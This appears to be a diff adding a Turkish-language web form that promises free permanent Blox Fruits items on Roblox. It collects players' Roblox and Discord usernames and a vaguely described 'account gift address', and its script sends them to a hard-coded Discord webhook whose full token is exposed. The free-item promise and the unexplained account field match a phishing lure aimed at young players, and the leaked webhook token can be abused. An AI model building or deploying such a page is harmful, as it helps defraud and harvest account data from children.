@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="styles.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BloxTRFandom</title>
+</head>
+<body>
+    
+    <!-- background video removed — using img/bg.jpg as static background image instead -->
+
+    <div class="site-content">
+        <h1>BloxTRFandom Permanent Meyve Talebi</h1>
+
+        <!-- FORM -->
+        <form id="form">
+
+            <!--Roblox Kullanıcı adı-->
+            <nav class="nav bd-container">
+                <h3>Roblox Kullanıcı Adı</h3>
+                <input type="text" id="roblox-username" name="robloxUser" placeholder="Enter your Roblox username" />
+            </nav>
+
+            <!--Discord Kullanıcı adı-->
+            <nav class="nav bd-container">
+                <h3>Discord Kullanıcı Adı</h3>
+                <input type="text" id="discord-username" name="discordUser" placeholder="Enter your Discord username" />
+            </nav>
+
+            <!--İstediğin oyun içi giftler-->
+            <nav class="nav bd-container">
+                <h3>İstediğin oyun içi giftler</h3>
+                <select id="gift-select" name="giftRedeem">
+                    <option value="storage">+1 Fruit Storage</option>
+                    <option value="chance">2x Drop Chance</option>
+                    <option value="money">2x Money</option>
+                    <option value="mastery">2x Mastery</option>
+                    <option value="darkblade">Dark Blade (Low Chance)</option>
+                </select>
+            </nav>
+
+            <!--Denizler-->
+            <nav class="nav bd-container">
+                <h3>Erişiminiz olan Denizler</h3>
+                <select id="sea-select" name="sea">
+                    <option value="sea1">Sea 1</option>
+                    <option value="sea2">Sea 2 (700Lvl)</option>
+                    <option value="sea3">Sea 3 (1500Lvl)</option>
+                </select>
+            </nav>
+
+            <!--İstediğin Perm fruit-->
+            <nav class="nav bd-container">
+                <h3>İstediğin Permanent Fruit</h3>
+                <select id="fruit-select" name="fruits">
+                    <option value="spring">Spring (High Chance)</option>
+                    <option value="bomb">Bomb (High Chance)</option>
+                    <option value="flame">Flame (High Chance)</option>
+                    <option value="ice">Ice (Middle Chance)</option>
+                    <option value="eagle">Eagle (Middle Chance)</option>
+                    <option value="light">Light (Middle Chance)</option>
+                    <option value="buddha">Buddha (Low Chance)</option>
+                    <option value="portal">Portal (Low Chance)</option>
+                    <option value="trex">Trex (Low Chance)</option>
+                </select>
+                <h5>Stocklar günlük yenilenir.</h5>
+                <!-- (button removed from here; returned to its own submit block at end of form) -->
+            </nav>
+
+            <!--Hesap gift adresi-->
+            <nav class="nav bd-container">
+                <h3>Hesap gift adresi</h3>
+                <input type="text" id="gift-address" name="giftCode2" placeholder="Gift adresini giriniz"/>
+                <a href="#" target="_blank">Gift adresini nasıl bulurum?</a>
+            </nav>
+
+            <!-- Submit area: button + status (moved back to their own block so "Hesap gift adresi" is before it) -->
+            <nav class="nav bd-container">
+                <button type="submit">Talep yolla</button>
+                <p id="status" aria-live="polite"></p>
+            </nav>
+        </form>
+    </div>
+
+    <!-- WEBHOOK SCRIPTİ -->
+    <script>
+        // ❗ BURAYA kendi Discord webhook URL'ini yapıştır
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1440781222568661085/aeSIq64U2ZRlkM7z5ChtGWTIx3IG7Ztev8b6NRpX-ZH1QwU4_ScgOmkn4bvrgmZxLHRm";
+
+        document.getElementById("form").addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const fd = new FormData(e.target);
+
+            const payload = {
+                content: "🟦 Yeni Blox Fruits Perm Meyve Talebi",
+                embeds: [
+                    {
+                        title: "📌 Talep Bilgileri",
+                        color: 0x00aaff,
+                        fields: [
+                            { name: "Roblox Kullanıcı Adı", value: fd.get("robloxUser") || "—" },
+                            { name: "Discord Kullanıcı Adı", value: fd.get("discordUser") || "—" },
+                            { name: "Gift Kodu", value: fd.get("giftRedeem") || "—" },
+                            { name: "Erişilen Deniz", value: fd.get("sea") || "—" },
+                            { name: "İstenen Meyveler", value: fd.getAll("fruits").join(", ") || "—" },
+                            { name: "Gift Adresi", value: fd.get("giftCode2") || "—" }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            try {
+                const res = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                const statusEl = document.getElementById("status");
+                statusEl.className = res.ok ? 'status-success' : 'status-error';
+                statusEl.innerText = res.ok ? "Başarıyla talep yollandı!" : "Gönderim hatası!";
+            } catch (err) {
+                console.error(err);
+                const statusEl = document.getElementById("status");
+                statusEl.className = 'status-error';
+                statusEl.innerText = "Bağlantı hatası!";
+            }
+        });
+    </script>
+
+</body>
+</html>
